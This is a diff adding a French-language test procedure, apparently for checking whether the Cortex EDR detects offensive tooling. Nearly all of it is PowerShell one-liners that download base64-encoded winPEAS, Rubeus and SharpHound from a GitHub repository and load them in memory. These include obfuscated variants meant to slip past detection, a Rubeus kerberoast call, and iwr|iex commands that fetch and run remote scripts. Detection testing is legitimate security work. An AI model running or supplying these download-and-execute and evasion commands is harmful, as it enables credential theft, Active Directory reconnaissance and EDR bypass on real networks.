@@ -1,0 +1,59 @@
+Pour chaque personne, pouvez-vous indiquer :
+
+Hostname :
+Username :
+Heure de début des tests :
+Résultat pour chaque exécution : OK / Catch / Autres
+Version Powershell (Taper $PSVersionTable): 
+
+
+Afin de lancer les différentes commandes (1 par ligne), lancez powershell. Dans le cas où Cortex réagit et ferme powershell. N'hésitez pas à le rouvrir.
+
+
+# In memory execution
+
+## winpeas non obfusqué
+$b64 = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ptc-fberger/obfuscated/refs/heads/main/default/winPEAS.b64" -UseBasicParsing | Select-Object -ExpandProperty Content
+[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
+[WinPEAS.Program]::Main("".Split())
+--> Si le programme se lance, attendez quelques secondes pour voir si Cortex le catch et sinon vous pouvez fermer powershell et continuer les tests.
+
+## Rubeus non obfusqué
+$b64 = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ptc-fberger/obfuscated/refs/heads/main/default/Rubeus.b64" -UseBasicParsing | Select-Object -ExpandProperty Content
+[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
+[Rubeus.Program]::Main("--help".Split())
+[Rubeus.Program]::Main("kerberoast".Split())
+
+## SharpHound non obfusqué
+$b64 = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ptc-fberger/public-repo/refs/heads/main/SharpHound.exe.b64" -UseBasicParsing | Select-Object -ExpandProperty Content
+[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
+[SharpHound.Program]::Main("-h".Split())
+
+## winpeas obfusqué
+$b64 = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ptc-fberger/obfuscated/refs/heads/main/obfuscated/winPEAS.b64" -UseBasicParsing | Select-Object -ExpandProperty Content
+[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
+[winPEAS.UHJvZ3JhbUFB]::Main("".Split())
+--> Si le programme se lance, attendez quelques secondes pour voir si Cortex le catch et sinon vous pouvez fermer powershell et continuer les tests.
+
+## Rubeus obfusqué
+$b64 = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ptc-fberger/obfuscated/refs/heads/main/obfuscated/GuvashipCodeiNipter.b64" -UseBasicParsing | Select-Object -ExpandProperty Content
+[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
+[GonwilyUpsCard.AnoDeaeAdablet]::Main("hefmorphylcratic".split())
+[GonwilyUpsCard.AnoDeaeAdablet]::Main("dimicmoebiriathalizes".split())
+
+
+## SharpHound obfusqué
+$b64 = Invoke-WebRequest -Uri "https://raw.githubusercontent.com/ptc-fberger/obfuscated/refs/heads/main/obfuscated/SharpHound.b64" -UseBasicParsing | Select-Object -ExpandProperty Content
+[System.Reflection.Assembly]::Load([Convert]::FromBase64String($b64))
+[SharpHound.Program]::Main("-h".Split())
+
+
+# Script ps1
+## Sharphound
+. { iwr -useb https://raw.githubusercontent.com/ptc-fberger/public-repo/refs/heads/main/SharpHound.ps1 } | iex; Invoke-BloodHound -h
+
+## WinPEAS
+. { iwr -useb https://raw.githubusercontent.com/ptc-fberger/obfuscated/refs/heads/main/obfuscated/winPEAS.ps1 } | iex;
+--> Si le programme se lance, attendez quelques secondes pour voir si Cortex le catch et sinon vous pouvez fermer powershell et continuer les tests.
+
+
